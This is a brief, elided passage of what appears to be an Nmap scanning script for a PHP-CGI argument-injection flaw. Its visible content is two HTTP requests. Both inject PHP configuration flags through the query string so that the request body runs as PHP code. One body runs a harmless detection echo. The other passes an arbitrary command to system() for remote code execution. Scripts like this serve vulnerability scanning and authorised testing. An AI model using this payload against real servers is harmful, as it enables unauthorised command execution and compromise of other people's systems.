...
code execution.]],
  ...
  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true, auto = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
  ...
  local exploitation_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true, auto = true }, nil, "<?php system('"..cmd.."');die(); ?>")
